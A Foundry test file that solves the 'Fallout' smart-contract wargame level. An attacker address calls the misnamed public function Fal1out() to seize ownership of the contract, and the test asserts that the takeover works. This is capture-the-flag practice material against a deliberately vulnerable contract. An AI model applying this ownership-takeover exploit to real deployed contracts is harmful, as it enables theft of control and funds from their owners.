pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Fallout} from "../02 fallout/Fallout.sol";

contract FalloutTest is Test {
    address constant CONTRACT = address(42_000);
    address constant ATTACKER = address(42_001);
    Fallout falloutContract;

    function setUp() public {
        // Set general test settings
        vm.roll(1);
        vm.warp(100);
        vm.deal(CONTRACT, 1000000000000000000);
        vm.deal(ATTACKER, 1000000000000000000);

        vm.prank(CONTRACT);
        falloutContract = new Fallout();

        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 100);
    }

    function test_fallout() public {
        console.log(" ");
        console.log("====== INIT ======");
        console.log("contract owner : ");
        console.log(address(falloutContract.owner()));
        console.log("attacker address: ");
        console.log(address(ATTACKER));
        assertEq(falloutContract.owner(), address(0));

        console.log(" ");
        console.log("====== STEP 1 ======");
        vm.prank(ATTACKER);
        falloutContract.Fal1out();
        assertEq(falloutContract.owner(), address(ATTACKER));
        console.log("contract owner : ");
        console.log(address(falloutContract.owner()));
        console.log("attacker address: ");
        console.log(address(ATTACKER));
    }
}
